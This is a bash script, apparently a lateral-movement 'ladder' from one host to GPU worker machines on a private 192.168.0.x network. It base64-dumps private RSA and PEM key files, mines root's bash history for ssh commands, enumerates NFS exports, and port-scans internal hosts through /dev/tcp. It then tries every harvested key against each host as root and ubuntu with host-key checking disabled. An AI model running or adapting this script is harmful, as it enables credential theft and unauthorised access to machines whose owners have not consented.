#!/bin/bash
# g0023 -> vcc-worker ladder (no BCM installed; BCM=baidu cloud monitor)
echo "=== ID"; hostname; id -u
echo "=== CONF"; ls -la /root/conf 2>&1 | head -20
for f in /root/conf/hostlist /root/conf/*.sh; do [ -f "$f" ] && { echo "--- $f"; head -c 800 "$f"; echo; }; done
echo "=== CONFB64"; for f in /root/conf/*rsa* /root/conf/*pem*; do [ -f "$f" ] && { echo "--- $f"; base64 -w0 "$f" | head -c 5000; echo; }; done
echo "=== MYKEYS"; ls -l /root/.ssh /home/*/.ssh 2>&1 | head -30
echo "=== HRIST"; grep -aiE 'ssh |scp |vcc|192\.168\.0\.(2[0-9]|3[01])' /root/.bash_history 2>/dev/null | sort -u | cut -c1-170 | head -40
echo "=== EXPORTS"; exportfs -v 2>&1 | head -10; showmount -e 127.0.0.1 2>&1 | head -10
echo "=== NFSCLIENT"; mount | grep -E ' nfs| cifs' | head -5
echo "=== PORTS"
for h in 192.168.0.20 192.168.0.21 192.168.0.22 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  ( out=""; for p in 22 111 2049 2375 2376 6817 6818 8265 8081 10250 9400 80 443 8080 9090 6443 3306; do
      timeout 1 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && out="$out $p"; done; echo "OPEN $h:$out" ) &
done; wait
echo "=== DCGM"; for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  echo "--- $h"; timeout 8 curl -s -m 6 "http://$h:9400/metrics" 2>/dev/null | grep -E 'DCGM_FI_DEV_GPU_UTIL|DCGM_FI_DEV_NAME|DCGM_FI_DEV_FB_TOTAL' | awk '{print $1,$2}' | sort -u | head -6
done
echo "=== SSHKEYS"
KEYS="/root/.ssh/id_rsa /root/.ssh/id_ed25519 $(ls /root/conf/*rsa* 2>/dev/null | head -3) $(ls /home/*/.ssh/id_rsa 2>/dev/null | head -2)"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20 192.168.0.21 192.168.0.22; do
  for k in $KEYS; do
    [ -f "$k" ] || continue
    for u in root ubuntu; do
      ( r=$(timeout 10 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes "$u@$h" 'id; hostname' 2>&1 | head -3 | tr '\n' '|'); echo "TRY $u@$h $(basename $k) => ${r:0:120}" ) &
    done
    wait
  done
done
echo "=== VENDORDOC"; timeout 25 grep -rIls -m1 -E 'vcc-worker|192\.168\.0\.2[48]' /ssd/vendors /root /etc 2>/dev/null | head -10
echo "=== DONE"
